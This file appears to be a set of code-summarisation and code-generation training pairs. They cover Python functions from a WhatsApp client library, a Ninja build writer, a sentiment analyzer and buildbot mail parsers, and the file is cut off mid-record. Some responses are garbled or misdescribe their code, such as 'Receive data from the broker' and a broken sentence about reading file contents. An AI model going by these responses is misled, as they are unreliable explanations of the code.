{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef load(self, username):\n        config_dir = StorageTools.getStorageForPhone(username)\n        logger.debug(\"Detecting config for username=%s, dir=%s\" % (username, config_dir))\n        exhausted = []\n        for ftype in self.MAP_EXT:\n            if len(ftype):\n                fname = (self.NAME_FILE_CONFIG + \".\" + ftype)\n            else:\n                fname = self.NAME_FILE_CONFIG\n\n            fpath = os.path.join(config_dir, fname)\n            logger.debug(\"Trying %s\" % fpath)\n            if os.path.isfile(fpath):\n                return self.load_path(fpath)\n\n            exhausted.append(fpath)\n\n        logger.error(\"Could not find a config for username=%s, paths checked: %s\" % (username, \":\".join(exhausted)))", "response": "Load the config for a user."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconverts type to string.", "response": "def _type_to_str(self, type):\n        \"\"\"\n        :param type:\n        :type type: int\n        :return:\n        :rtype:\n        \"\"\"\n        for key, val in self.TYPE_NAMES.items():\n            if key == type:\n                return val"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef load_path(self, path):\n        logger.debug(\"load_path(path=%s)\" % path)\n        if os.path.isfile(path):\n            configtype = self.guess_type(path)\n            logger.debug(\"Detected config type: %s\" % self._type_to_str(configtype))\n            if configtype in self.TYPES:\n                logger.debug(\"Opening config for reading\")\n                with open(path, 'r') as f:\n                    data = f.read()\n                datadict = self.TYPES[configtype]().reverse(data)\n                return self.load_data(datadict)\n            else:\n                raise ValueError(\"Unsupported config type\")\n        else:\n            logger.warn(\"load_path couldn't find the path: %s\" % path)", "response": "Load the data from a file or directory."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef flush_keys(self, signed_prekey, prekeys, reboot_connection=False):\n        preKeysDict = {}\n        for prekey in prekeys:\n            keyPair = prekey.getKeyPair()\n            preKeysDict[self.adjustId(prekey.getId())] = self.adjustArray(keyPair.getPublicKey().serialize()[1:])\n\n        signedKeyTuple = (self.adjustId(signed_prekey.getId()),\n                          self.adjustArray(signed_prekey.getKeyPair().getPublicKey().serialize()[1:]),\n                          self.adjustArray(signed_prekey.getSignature()))\n\n        setKeysIq = SetKeysIqProtocolEntity(\n            self.adjustArray(\n                self.manager.identity.getPublicKey().serialize()[1:]\n            ),\n            signedKeyTuple,\n            preKeysDict,\n            Curve.DJB_TYPE,\n            self.adjustId(self.manager.registration_id)\n        )\n\n        onResult = lambda _, __: self.on_keys_flushed(prekeys, reboot_connection=reboot_connection)\n        self._sendIq(setKeysIq, onResult, self.onSentKeysError)", "response": "Sends a SetKeysIqProtocolEntity to the server to flush the keys in the specified list of prekeys."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a new YowStack instance with the default layers added.", "response": "def getDefaultStack(layer = None, axolotl = False, groups = True, media = True, privacy = True, profiles = True):\n        \"\"\"\n        :param layer: An optional layer to put on top of default stack\n        :param axolotl: E2E encryption enabled/ disabled\n        :return: YowStack\n        \"\"\"\n\n        allLayers = YowStackBuilder.getDefaultLayers(axolotl, groups = groups, media=media,privacy=privacy, profiles=profiles)\n        if layer:\n            allLayers = allLayers + (layer,)\n\n\n        return YowStack(allLayers, reversed = False)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef transform(self, data):\n        out=[]\n        keys = sorted(data.keys())\n        for k in keys:\n            out.append(\"%s=%s\" % (k, data[k]))\n        return \"\\n\".join(out)", "response": "Transform a dictionary of key = value pairs into a string."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nserialize a config object to bytes.", "response": "def serialize(self, config):\n        \"\"\"\n        :param config:\n        :type config: yowsup.config.base.config.Config\n        :return:\n        :rtype: bytes\n        \"\"\"\n        for transform in self._transforms:\n            config = transform.transform(config)\n        return config"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nstoring the given sender key in the database.", "response": "def storeSenderKey(self, senderKeyName, senderKeyRecord):\n        \"\"\"\n        :type senderKeyName: SenderKeName\n        :type senderKeyRecord: SenderKeyRecord\n        \"\"\"\n        q = \"INSERT INTO sender_keys (group_id, sender_id, record) VALUES(?,?, ?)\"\n        cursor = self.dbConn.cursor()\n        serialized = senderKeyRecord.serialize()\n        if sys.version_info < (2,7):\n            serialized = buffer(serialized)\n        try:\n            cursor.execute(q, (senderKeyName.getGroupId(), senderKeyName.getSender().getName(), serialized))\n            self.dbConn.commit()\n        except sqlite3.IntegrityError as e:\n            q = \"UPDATE sender_keys set record = ? WHERE group_id = ? and sender_id = ?\"\n            cursor = self.dbConn.cursor()\n            cursor.execute(q, (serialized, senderKeyName.getGroupId(), senderKeyName.getSender().getName()))\n            self.dbConn.commit()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef loadSenderKey(self, senderKeyName):\n        q = \"SELECT record FROM sender_keys WHERE group_id = ? and sender_id = ?\"\n        cursor = self.dbConn.cursor()\n        cursor.execute(q, (senderKeyName.getGroupId(), senderKeyName.getSender().getName()))\n\n        result = cursor.fetchone()\n        if not result:\n            return SenderKeyRecord()\n        return SenderKeyRecord(serialized = result[0])", "response": "Load the sender key record for the given senderKeyName."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsend an IQ to the server.", "response": "def sendIq(self, entity):\n        \"\"\"\n        :type entity: IqProtocolEntity\n        \"\"\"\n        if entity.getType() == IqProtocolEntity.TYPE_SET and entity.getXmlns() == \"w:m\":\n            #media upload!\n            self._sendIq(entity, self.onRequestUploadSuccess, self.onRequestUploadError)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef receive(self, protocolTreeNode):\n        if not self.processIqRegistry(protocolTreeNode):\n            if protocolTreeNode.tag == \"message\":\n                self.onMessage(protocolTreeNode)\n            elif not protocolTreeNode.tag == \"receipt\":\n                #receipts will be handled by send layer\n                self.toUpper(protocolTreeNode)", "response": "Process a node and process it."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef send(self, data):\n        data = bytes(data) if type(data) is not bytes else data\n        self._wa_noiseprotocol.send(data)", "response": "Send data to the WA noise server."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreceiving data from the broker.", "response": "def receive(self, data):\n        \"\"\"\n        :param data:\n        :type data: bytes\n        :return:\n        :rtype:\n        \"\"\"\n        self._incoming_segments_queue.put(data)\n        if not self._in_handshake():\n            self._flush_incoming_buffer()"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef getCurrent(cls):\n        if cls.__CURR is None:\n            env = DEFAULT\n            envs = cls.getRegisteredEnvs()\n            if env not in envs:\n                env = envs[0]\n            logger.debug(\"Env not set, setting it to %s\" % env)\n            cls.setEnv(env)\n        return cls.__CURR", "response": "Returns the current YowsupEnv\n            instance."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef setAsSent(self, prekeyIds):\n        for prekeyId in prekeyIds:\n            q = \"UPDATE prekeys SET sent_to_server = ? WHERE prekey_id = ?\"\n            cursor = self.dbConn.cursor()\n            cursor.execute(q, (1, prekeyId))\n        self.dbConn.commit()", "response": "Set the prekey ids as sent to server."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef transform(self, config):\n        out = {}\n        for prop in vars(config):\n            out[prop] = getattr(config, prop)\n        return out", "response": "Transform the configuration dictionary into a dictionary of key - value pairs."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef notify(msg, msg_type=0, t=None):\n    msg = msg.replace('\"', '\\\\\"')\n    \"Show system notification with duration t (ms)\"\n    if platform.system() == \"Darwin\":\n        command = notify_command_osx(msg, msg_type, t)\n    else:\n        command = notify_command_linux(msg, t)\n\n    try:\n        subprocess.call(command)\n        return True\n    except OSError as e:\n        return False", "response": "Show system notification with duration t ( ms"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef start_playing(self, on_exit, args):\n        # log.debug(\"%s,%s,%s\" % (args['song_id'], args['song_name'], args['mp3_url']))\n        if \"cache\" in args.keys() and os.path.isfile(args[\"cache\"]):\n            thread = threading.Thread(\n                target=self.run_mpg123, args=(on_exit, args[\"cache\"])\n            )\n        else:\n            new_url = NetEase().songs_url([args[\"song_id\"]])[0][\"url\"]  #\u4f7f\u7528\u65b0\u5730\u5740\n            if  not new_url:    #\u5982\u679c\u6ca1\u6709\u83b7\u5f97\u65b0\u5730\u5740\n                new_url = args[\"mp3_url\"]  #\u4f7f\u7528\u8001\u5730\u5740\u4f20\u7ed9mpg123\n            thread = threading.Thread(\n                target=self.run_mpg123,\n                args=(on_exit, new_url, args[\"expires\"], args[\"get_time\"]),\n            )\n            cache_thread = threading.Thread(\n                target=self.download_song,\n                args=(\n                    args[\"song_id\"],\n                    args[\"song_name\"],\n                    args[\"artist\"],\n                    args[\"mp3_url\"],\n                ),\n            )\n            cache_thread.start()\n\n        thread.start()\n        lyric_download_thread = threading.Thread(target=self.download_lyric)\n        lyric_download_thread.start()\n        tlyric_download_thread = threading.Thread(\n            target=self.download_lyric, args=(True,)\n        )\n        tlyric_download_thread.start()\n        # returns immediately after the thread starts\n        return thread", "response": "Starts the main thread that downloads the song and lyrics from the mp3."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nexpands a string containing a set of variables as Ninja would.", "response": "def expand(string, vars, local_vars={}):\n    \"\"\"Expand a string containing $vars as Ninja would.\n\n    Note: doesn't handle the full Ninja variable syntax, but it's enough\n    to make configure.py's use of it work.\n    \"\"\"\n    def exp(m):\n        var = m.group(1)\n        if var == '$':\n            return '$'\n        return local_vars.get(var, vars.get(var, ''))\n    return re.sub(r'\\$(\\$|\\w*)', exp, string)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _count_dollars_before_index(self, s, i):\n        dollar_count = 0\n        dollar_index = i - 1\n        while dollar_index > 0 and s[dollar_index] == '$':\n            dollar_count += 1\n            dollar_index -= 1\n        return dollar_count", "response": "Returns the number of dollar characters right in front of s [ i."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _line(self, text, indent=0):\n        leading_space = '  ' * indent\n        while len(leading_space) + len(text) > self.width:\n            # The text is too wide; wrap if possible.\n\n            # Find the rightmost space that would obey our width constraint and\n            # that's not an escaped space.\n            available_space = self.width - len(leading_space) - len(' $')\n            space = available_space\n            while True:\n                space = text.rfind(' ', 0, space)\n                if (space < 0 or\n                    self._count_dollars_before_index(text, space) % 2 == 0):\n                    break\n\n            if space < 0:\n                # No such space; just use the first unescaped space we can find.\n                space = available_space - 1\n                while True:\n                    space = text.find(' ', space + 1)\n                    if (space < 0 or\n                        self._count_dollars_before_index(text, space) % 2 == 0):\n                        break\n            if space < 0:\n                # Give up on breaking.\n                break\n\n            self.output.write(leading_space + text[0:space] + ' $\\n')\n            text = text[space+1:]\n\n            # Subsequent lines are continuations, so indent them.\n            leading_space = '  ' * (indent+2)\n\n        self.output.write(leading_space + text + '\\n')", "response": "Write text word - wrapped at self. width characters."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _expand_paths(self, paths):\n        paths = ninja_syntax.as_list(paths)\n        return ' '.join(map(self._shell_escape, (map(self._expand, paths))))", "response": "Expand the paths in an array of paths e. g. from a build block."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _expand(self, str, local_vars={}):\n        return ninja_syntax.expand(str, self.vars, local_vars)", "response": "Expand the given string with the given variables."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _run_command(self, cmdline):\n        try:\n            if self.verbose:\n                print(cmdline)\n            subprocess.check_call(cmdline, shell=True)\n        except subprocess.CalledProcessError:\n            print('when running: ', cmdline)\n            raise", "response": "Run a subcommand quietly. Prints the full command on error."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef paretoint(avg, alpha):\n    return int(random.paretovariate(alpha) * avg / (alpha / (alpha - 1)))", "response": "Returns a random integer that s avg on average following a power law."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nwrites master build. ninja file referencing all given subninjas.", "response": "def write_master_ninja(master_ninja, targets):\n    \"\"\"Writes master build.ninja file, referencing all given subninjas.\"\"\"\n    master_ninja.variable('cxx', 'c++')\n    master_ninja.variable('ld', '$cxx')\n    if sys.platform == 'darwin':\n        master_ninja.variable('alink', 'libtool -static')\n    else:\n        master_ninja.variable('alink', 'ar rcs')\n    master_ninja.newline()\n\n    master_ninja.pool('link_pool', depth=4)\n    master_ninja.newline()\n\n    master_ninja.rule('cxx', description='CXX $out',\n      command='$cxx -MMD -MF $out.d $defines $includes $cflags -c $in -o $out',\n      depfile='$out.d', deps='gcc')\n    master_ninja.rule('alink', description='ARCHIVE $out',\n      command='rm -f $out && $alink -o $out $in')\n    master_ninja.rule('link', description='LINK $out', pool='link_pool',\n      command='$ld $ldflags -o $out $in $libs')\n    master_ninja.rule('stamp', description='STAMP $out', command='touch $out')\n    master_ninja.newline()\n\n    for target in targets:\n        master_ninja.subninja(target.ninja_file_path)\n    master_ninja.newline()\n\n    master_ninja.comment('Short names for targets.')\n    for target in targets:\n        if target.name != target.output:\n            master_ninja.build(target.name, 'phony', target.output)\n    master_ninja.newline()\n\n    master_ninja.build('all', 'phony', [target.output for target in targets])\n    master_ninja.default('all')"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef FileWriter(path):\n    try:\n        os.makedirs(os.path.dirname(path))\n    except OSError:\n        pass\n    f = open(path, 'w')\n    yield ninja_syntax.Writer(f)\n    f.close()", "response": "Context manager for a ninja_syntax object writing to a file."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef load_jupyter_server_extension(nbapp):\n    here = PACKAGE_DIR\n    nbapp.log.info('nteract extension loaded from %s' % here)\n\n    app_dir = here  # bundle is part of the python package\n\n    web_app = nbapp.web_app\n    config = NteractConfig(parent=nbapp)\n\n    # original\n    # config.assets_dir = os.path.join(app_dir, 'static')\n    config.assets_dir = app_dir\n\n    config.page_url = '/nteract'\n    config.dev_mode = False\n\n    # Check for core mode.\n    core_mode = ''\n    if hasattr(nbapp, 'core_mode'):\n        core_mode = nbapp.core_mode\n\n    # Check for an app dir that is local.\n    if app_dir == here or app_dir == os.path.join(here, 'build'):\n        core_mode = True\n        config.settings_dir = ''\n\n    web_app.settings.setdefault('page_config_data', dict())\n    web_app.settings['page_config_data']['token'] = nbapp.token\n    web_app.settings['page_config_data']['ga_code'] = config.ga_code\n    web_app.settings['page_config_data']['asset_url'] = config.asset_url\n\n    web_app.settings['nteract_config'] = config\n\n    add_handlers(web_app, config)", "response": "Load the server extension."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nadd the appropriate handlers to the web app.", "response": "def add_handlers(web_app, config):\n    \"\"\"Add the appropriate handlers to the web app.\n    \"\"\"\n    base_url = web_app.settings['base_url']\n    url = ujoin(base_url, config.page_url)\n    assets_dir = config.assets_dir\n\n    package_file = os.path.join(assets_dir, 'package.json')\n    with open(package_file) as fid:\n        data = json.load(fid)\n\n    config.version = config.version or data['version']\n    config.name = config.name or data['name']\n\n    handlers = [\n        # TODO Redirect to /tree\n        (url + r'/?', NAppHandler, {'config': config, 'page': 'tree'}),\n        (url + r\"/tree%s\" % path_regex, NAppHandler, {'config': config, 'page': 'tree'}),\n        (url + r\"/edit%s\" % path_regex, NAppHandler, {'config': config, 'page': 'edit'}),\n        (url + r\"/view%s\" % path_regex, NAppHandler, {'config': config, 'page': 'view'}),\n        (url + r\"/static/(.*)\", FileFindHandler, {'path': assets_dir}),\n    ]\n\n    web_app.add_handlers(\".*$\", handlers)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a new version object for the given version.", "response": "def semver(version, loose):\n    if isinstance(version, SemVer):\n        if version.loose == loose:\n            return version\n        else:\n            version = version.version\n    elif not isinstance(version, string_type):  # xxx:\n        raise ValueError(\"Invalid Version: {}\".format(version))\n\n    \"\"\"\n    if (!(this instanceof SemVer))\n       return new SemVer(version, loose);\n    \"\"\"\n    return SemVer(version, loose)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_list_from_file(file_name):\n    with open(file_name, mode='r', encoding='utf-8') as f1:\n        lst = f1.readlines()\n    return lst", "response": "read the lines from a file into a list"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef append_to_file(file_name, line_data):\n    with open(file_name, mode='a', encoding='utf-8') as f1:\n        f1.write(line_data)\n        f1.write(\"\\n\")", "response": "append a line of text to a file"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ndetermine if input contains negation words", "response": "def negated(input_words, include_nt=True):\n    \"\"\"\n    Determine if input contains negation words\n    \"\"\"\n    input_words = [str(w).lower() for w in input_words]\n    neg_words = []\n    neg_words.extend(NEGATE)\n    for word in neg_words:\n        if word in input_words:\n            return True\n    if include_nt:\n        for word in input_words:\n            if \"n't\" in word:\n                return True\n    if \"least\" in input_words:\n        i = input_words.index(\"least\")\n        if i > 0 and input_words[i - 1] != \"at\":\n            return True\n    return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nchecking whether all items in words are ALL CAPS", "response": "def allcap_differential(words):\n    \"\"\"\n    Check whether just some words in the input are ALL CAPS\n    :param list words: The words to inspect\n    :returns: `True` if some but not all items in `words` are ALL CAPS\n    \"\"\"\n    is_different = False\n    allcap_words = 0\n    for word in words:\n        if word.isupper():\n            allcap_words += 1\n    cap_differential = len(words) - allcap_words\n    if 0 < cap_differential < len(words):\n        is_different = True\n    return is_different"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncalculates the scalar value for a given word.", "response": "def scalar_inc_dec(word, valence, is_cap_diff):\n    \"\"\"\n    Check if the preceding words increase, decrease, or negate/nullify the\n    valence\n    \"\"\"\n    scalar = 0.0\n    word_lower = word.lower()\n    if word_lower in BOOSTER_DICT:\n        scalar = BOOSTER_DICT[word_lower]\n        if valence < 0:\n            scalar *= -1\n        # check if booster/dampener word is in ALLCAPS (while others aren't)\n        if word.isupper() and is_cap_diff:\n            if valence > 0:\n                scalar += C_INCR\n            else:\n                scalar -= C_INCR\n    return scalar"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _words_plus_punc(self):\n        no_punc_text = REGEX_REMOVE_PUNCTUATION.sub('', self.text)\n        # removes punctuation (but loses emoticons & contractions)\n        words_only = no_punc_text.split()\n        # remove singletons\n        words_only = set(w for w in words_only if len(w) > 1)\n        # the product gives ('cat', ',') and (',', 'cat')\n        punc_before = {''.join(p): p[1] for p in product(PUNC_LIST, words_only)}\n        punc_after = {''.join(p): p[0] for p in product(words_only, PUNC_LIST)}\n        words_punc_dict = punc_before\n        words_punc_dict.update(punc_after)\n        return words_punc_dict", "response": "Returns a dictionary of words with punctuation added to the log entry."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of words and emoticons from the text.", "response": "def _words_and_emoticons(self):\n        \"\"\"\n        Removes leading and trailing puncutation\n        Leaves contractions and most emoticons\n            Does not preserve punc-plus-letter emoticons (e.g. :D)\n        \"\"\"\n        wes = self.text.split()\n        words_punc_dict = self._words_plus_punc()\n        wes = [we for we in wes if len(we) > 1]\n        for i, we in enumerate(wes):\n            if we in words_punc_dict:\n                wes[i] = words_punc_dict[we]\n        return wes"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert lexicon file to a dictionary", "response": "def make_lex_dict(self):\n        \"\"\"\n        Convert lexicon file to a dictionary\n        \"\"\"\n        lex_dict = {}\n        for line in self.lexicon_full_filepath.split('\\n'):\n            (word, measure) = line.strip().split('\\t')[0:2]\n            lex_dict[word] = float(measure)\n        return lex_dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef make_emoji_dict(self):\n        emoji_dict = {}\n        for line in self.emoji_full_filepath.split('\\n'):\n            (emoji, description) = line.strip().split('\\t')[0:2]\n            emoji_dict[emoji] = description\n        return emoji_dict", "response": "Convert the emoji lexicon file to a dictionary"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef polarity_scores(self, text):\n        # convert emojis to their textual descriptions\n        text_token_list = text.split()\n        text_no_emoji_lst = []\n        for token in text_token_list:\n            if token in self.emojis:\n                # get the textual description\n                description = self.emojis[token]\n                text_no_emoji_lst.append(description)\n            else:\n                text_no_emoji_lst.append(token)\n        text = \" \".join(x for x in text_no_emoji_lst)\n\n        sentitext = SentiText(text)\n\n        sentiments = []\n        words_and_emoticons = sentitext.words_and_emoticons\n        for item in words_and_emoticons:\n            valence = 0\n            i = words_and_emoticons.index(item)\n            # check for vader_lexicon words that may be used as modifiers or negations\n            if item.lower() in BOOSTER_DICT:\n                sentiments.append(valence)\n                continue\n            if (i < len(words_and_emoticons) - 1 and item.lower() == \"kind\" and\n                    words_and_emoticons[i + 1].lower() == \"of\"):\n                sentiments.append(valence)\n                continue\n\n            sentiments = self.sentiment_valence(valence, sentitext, item, i, sentiments)\n\n        sentiments = self._but_check(words_and_emoticons, sentiments)\n\n        valence_dict = self.score_valence(sentiments, text)\n\n        return valence_dict", "response": "Return a dict of sentiment strength based on the input text."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef read(*parts):\n    with codecs.open(os.path.join(HERE, *parts), \"rb\", \"utf-8\") as f:\n        return f.read()", "response": "Read the contents of the\n    from the given path and return the contents of the\n   ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse(self, m, prefix=None):\n        # The mail is sent from the person doing the checkin. Assume that the\n        # local username is enough to identify them (this assumes a one-server\n        # cvs-over-rsh environment rather than the server-dirs-shared-over-NFS\n        # model)\n        name, addr = parseaddr(m[\"from\"])\n        if not addr:\n            # no From means this message isn't from buildbot-cvs-mail\n            return None\n        at = addr.find(\"@\")\n        if at == -1:\n            author = addr  # might still be useful\n        else:\n            author = addr[:at]\n        author = util.bytes2unicode(author, encoding=\"ascii\")\n\n        # CVS accepts RFC822 dates. buildbot-cvs-mail adds the date as\n        # part of the mail header, so use that.\n        # This assumes cvs is being access via ssh or pserver, so the time\n        # will be the CVS server's time.\n\n        # calculate a \"revision\" based on that timestamp, or the current time\n        # if we're unable to parse the date.\n        log.msg('Processing CVS mail')\n        dateTuple = parsedate_tz(m[\"date\"])\n        if dateTuple is None:\n            when = util.now()\n        else:\n            when = mktime_tz(dateTuple)\n\n        theTime = datetime.datetime.utcfromtimestamp(float(when))\n        rev = theTime.strftime('%Y-%m-%d %H:%M:%S')\n\n        catRE = re.compile(r'^Category:\\s*(\\S.*)')\n        cvsRE = re.compile(r'^CVSROOT:\\s*(\\S.*)')\n        cvsmodeRE = re.compile(r'^Cvsmode:\\s*(\\S.*)')\n        filesRE = re.compile(r'^Files:\\s*(\\S.*)')\n        modRE = re.compile(r'^Module:\\s*(\\S.*)')\n        pathRE = re.compile(r'^Path:\\s*(\\S.*)')\n        projRE = re.compile(r'^Project:\\s*(\\S.*)')\n        singleFileRE = re.compile(r'(.*) (NONE|\\d(\\.|\\d)+) (NONE|\\d(\\.|\\d)+)')\n        tagRE = re.compile(r'^\\s+Tag:\\s*(\\S.*)')\n        updateRE = re.compile(r'^Update of:\\s*(\\S.*)')\n        comments = \"\"\n        branch = None\n        cvsroot = None\n        fileList = None\n        files = []\n        isdir = 0\n        path = None\n        project = None\n\n        lines = list(body_line_iterator(m))\n        while lines:\n            line = lines.pop(0)\n            m = catRE.match(line)\n            if m:\n                category = m.group(1)\n                continue\n            m = cvsRE.match(line)\n            if m:\n                cvsroot = m.group(1)\n                continue\n            m = cvsmodeRE.match(line)\n            if m:\n                cvsmode = m.group(1)\n                continue\n            m = filesRE.match(line)\n            if m:\n                fileList = m.group(1)\n                continue\n            m = modRE.match(line)\n            if m:\n                # We don't actually use this\n                # module = m.group(1)\n                continue\n            m = pathRE.match(line)\n            if m:\n                path = m.group(1)\n                continue\n            m = projRE.match(line)\n            if m:\n                project = m.group(1)\n                continue\n            m = tagRE.match(line)\n            if m:\n                branch = m.group(1)\n                continue\n            m = updateRE.match(line)\n            if m:\n                # We don't actually use this\n                # updateof = m.group(1)\n                continue\n            if line == \"Log Message:\\n\":\n                break\n\n        # CVS 1.11 lists files as:\n        #   repo/path file,old-version,new-version file2,old-version,new-version\n        # Version 1.12 lists files as:\n        #   file1 old-version new-version file2 old-version new-version\n        #\n        # files consists of tuples of 'file-name old-version new-version'\n        # The versions are either dotted-decimal version numbers, ie 1.1\n        # or NONE. New files are of the form 'NONE NUMBER', while removed\n        # files are 'NUMBER NONE'. 'NONE' is a literal string\n        # Parsing this instead of files list in 'Added File:' etc\n        # makes it possible to handle files with embedded spaces, though\n        # it could fail if the filename was 'bad 1.1 1.2'\n        # For cvs version 1.11, we expect\n        #  my_module new_file.c,NONE,1.1\n        #  my_module removed.txt,1.2,NONE\n        #  my_module modified_file.c,1.1,1.2\n        # While cvs version 1.12 gives us\n        #  new_file.c NONE 1.1\n        #  removed.txt 1.2 NONE\n        #  modified_file.c 1.1,1.2\n\n        if fileList is None:\n            log.msg('CVSMaildirSource Mail with no files. Ignoring')\n            return None       # We don't have any files. Email not from CVS\n\n        if cvsmode == '1.11':\n            # Please, no repo paths with spaces!\n            m = re.search('([^ ]*) ', fileList)\n            if m:\n                path = m.group(1)\n            else:\n                log.msg(\n                    'CVSMaildirSource can\\'t get path from file list. Ignoring mail')\n                return\n            fileList = fileList[len(path):].strip()\n            singleFileRE = re.compile(\n                r'(.+?),(NONE|(?:\\d+\\.(?:\\d+\\.\\d+\\.)*\\d+)),(NONE|(?:\\d+\\.(?:\\d+\\.\\d+\\.)*\\d+))(?: |$)')\n        elif cvsmode == '1.12':\n            singleFileRE = re.compile(\n                r'(.+?) (NONE|(?:\\d+\\.(?:\\d+\\.\\d+\\.)*\\d+)) (NONE|(?:\\d+\\.(?:\\d+\\.\\d+\\.)*\\d+))(?: |$)')\n            if path is None:\n                raise ValueError(\n                    'CVSMaildirSource cvs 1.12 require path. Check cvs loginfo config')\n        else:\n            raise ValueError(\n                'Expected cvsmode 1.11 or 1.12. got: %s' % cvsmode)\n\n        log.msg(\"CVSMaildirSource processing filelist: %s\" % fileList)\n        while(fileList):\n            m = singleFileRE.match(fileList)\n            if m:\n                curFile = path + '/' + m.group(1)\n                files.append(curFile)\n                fileList = fileList[m.end():]\n            else:\n                log.msg('CVSMaildirSource no files matched regex. Ignoring')\n                return None   # bail - we couldn't parse the files that changed\n        # Now get comments\n        while lines:\n            line = lines.pop(0)\n            comments += line\n\n        comments = comments.rstrip() + \"\\n\"\n        if comments == '\\n':\n            comments = None\n        return ('cvs', dict(author=author, files=files, comments=comments,\n                            isdir=isdir, when=when, branch=branch,\n                            revision=rev, category=category,\n                            repository=cvsroot, project=project,\n                            properties=self.properties))", "response": "Parse a buildbot - cvs - mail message and return a dict of buildbot - cvs - mail attributes."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the message body from the svn commit - email. pl trigger.", "response": "def parse(self, m, prefix=None):\n        \"\"\"Parse messages sent by the svn 'commit-email.pl' trigger.\n        \"\"\"\n\n        # The mail is sent from the person doing the checkin. Assume that the\n        # local username is enough to identify them (this assumes a one-server\n        # cvs-over-rsh environment rather than the server-dirs-shared-over-NFS\n        # model)\n        name, addr = parseaddr(m[\"from\"])\n        if not addr:\n            return None  # no From means this message isn't from svn\n        at = addr.find(\"@\")\n        if at == -1:\n            author = addr  # might still be useful\n        else:\n            author = addr[:at]\n\n        # we take the time of receipt as the time of checkin. Not correct (it\n        # depends upon the email latency), but it avoids the\n        # out-of-order-changes issue. Also syncmail doesn't give us anything\n        # better to work with, unless you count pulling the v1-vs-v2\n        # timestamp out of the diffs, which would be ugly. TODO: Pulling the\n        # 'Date:' header from the mail is a possibility, and\n        # email.utils.parsedate_tz may be useful. It should be configurable,\n        # however, because there are a lot of broken clocks out there.\n        when = util.now()\n\n        files = []\n        comments = \"\"\n        lines = list(body_line_iterator(m))\n        rev = None\n        while lines:\n            line = lines.pop(0)\n\n            # \"Author: jmason\"\n            match = re.search(r\"^Author: (\\S+)\", line)\n            if match:\n                author = match.group(1)\n\n            # \"New Revision: 105955\"\n            match = re.search(r\"^New Revision: (\\d+)\", line)\n            if match:\n                rev = match.group(1)\n\n            # possible TODO: use \"Date: ...\" data here instead of time of\n            # commit message receipt, above. however, this timestamp is\n            # specified *without* a timezone, in the server's local TZ, so to\n            # be accurate buildbot would need a config setting to specify the\n            # source server's expected TZ setting! messy.\n\n            # this stanza ends with the \"Log:\"\n            if (line == \"Log:\\n\"):\n                break\n\n        # commit message is terminated by the file-listing section\n        while lines:\n            line = lines.pop(0)\n            if line in (\"Modified:\\n\", \"Added:\\n\", \"Removed:\\n\"):\n                break\n            comments += line\n        comments = comments.rstrip() + \"\\n\"\n\n        while lines:\n            line = lines.pop(0)\n            if line == \"\\n\":\n                break\n            if line.find(\"Modified:\\n\") == 0:\n                continue            # ignore this line\n            if line.find(\"Added:\\n\") == 0:\n                continue            # ignore this line\n            if line.find(\"Removed:\\n\") == 0:\n                continue            # ignore this line\n            line = line.strip()\n\n            thesefiles = line.split(\" \")\n            for f in thesefiles:\n                if prefix:\n                    # insist that the file start with the prefix: we may get\n                    # changes we don't care about too\n                    if 